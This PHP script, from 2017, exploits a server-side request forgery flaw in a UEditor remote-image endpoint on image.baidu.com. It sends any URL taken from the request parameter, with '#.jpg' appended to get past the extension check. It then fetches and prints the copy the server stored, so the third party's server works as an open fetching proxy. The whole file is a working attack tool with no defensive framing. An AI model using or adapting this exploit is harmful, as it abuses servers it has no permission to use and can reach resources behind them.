<?php
/**
 * Created by PhpStorm.
 * User: Tea
 * Date: 2017/10/20
 * Time: 15:46
 */

header("Content-type: text/html; charset=utf-8");

function HttpRequest($url, $method = "GET", $data = "", $referer = "")
{
    if (!$referer) {
        $referer = $url;
    }
    $options = array(
        "http" => array(
            "method" => "GET",
            "header" => "User-Agent:Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:56.0) Gecko/20200101 Firefox/56.0\r\n" . "Content-type:application/x-www-form-urlencoded\r\n" . "Referer:" . $referer,
            "timeout" => 30
        )
    );
    if ("GET" == strtoupper($method)) {
        $content = stream_context_create($options);
        $result = file_get_contents($url, false, $content);
        return $result;
    } elseif ("POST" == strtoupper($method)) {
        $postdata = http_build_query($data);
        $options['http']['method'] = "POST";
        $options['http']['content'] = $postdata;
        $content = stream_context_create($options);
        $result = file_get_contents($url, false, $content);
        return $result;
    } else {
        return false;
    }
}

function VulRequest($requrl = "")
{
    $vulurl = "http://image.baidu.com/interface/ueditor/php/getRemoteImage.php";
    $vuldata = array(
        'upfile' => $requrl . "#.jpg",
    );
    $vulresult = HttpRequest($vulurl, "POST", $vuldata);
    $vulresult = str_replace('{', '', $vulresult);
    $vulresult = str_replace('}', '', $vulresult);
    $content = str_replace('\'', '', $vulresult);
    $content_array = explode(',', $content);
    for ($i = 0; $i < count($content_array); $i++) {
        if ($i == 0) {
            $tmp_content = explode(':', $content_array[$i]);
            if (($tmp_content[0] == 'url') and ($tmp_content[1] != 'error')) {
                $url = "http://image.baidu.com/interface/ueditor/php/"; //Get Dir Pic
                $url_full = $url . $tmp_content[1];
                //echo $url_full;
                echo HttpRequest($url_full);
            } else {
                echo 'Request Error!';
            }
        }
    }
}

$requrl = $_REQUEST['url'];
if ($requrl) {
    VulRequest($requrl);
} else {
    echo "Url Is Empty!!!";
}
